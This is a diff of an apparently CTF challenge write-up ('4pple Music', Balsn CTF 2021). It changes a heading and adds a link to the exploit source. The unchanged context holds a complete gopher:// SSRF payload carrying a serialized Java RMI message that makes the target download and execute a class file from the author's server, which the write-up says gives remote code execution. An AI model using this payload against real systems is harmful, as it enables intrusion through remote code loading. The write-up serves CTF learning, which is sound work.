@@ -41,7 +41,7 @@ There are many interesting unintended solutions :D
 
 ---
 
-## 4pple Music
+# 4pple Music
 
 - Difficulty: ★★
 - Type: Web
@@ -145,7 +145,7 @@ So we can try to attack the codebase, setting the codebase to our server:
 gopher://flagserver.local:34571/_JRMI%2500%2502K%2500%2500%2500%2500%2500%2500P%25AC%25ED%2500%2505w%2522%2500%2500%2500%2500%2500%2500%2500%2502%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25F6%25B6%2589%258D%258B%25F2%2586Cur%2500%2518%255BLjava.rmi.server.ObjID%253B%2587%2513%2500%25B8%25D0%252Cd%257E%2502%2500%2500pxp%2500%2500%2500%2500w%2508%2500%2500%2500%2500%2500%2500%2500%2500sr%2500%2510kaibro.RMILoader%2500%2500%2500%2500%2500%2500%2500%2501%2502%2500%2500t%2500%2516http%253A%252F%252F30cm.club%252F%252F%252F%252F%252F%252Fxpw%2501%2500%250A
 ```
 
-This payload will download my malicious class file from `http://30cm.club/kaibro/RMILoader.class` and execute it!
+This payload will download my [malicious class file](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2021/4ppleMusic/exploit/kaibro/RMILoader.java) from `http://30cm.club/kaibro/RMILoader.class` and execute it!
 
 => RCE!
 
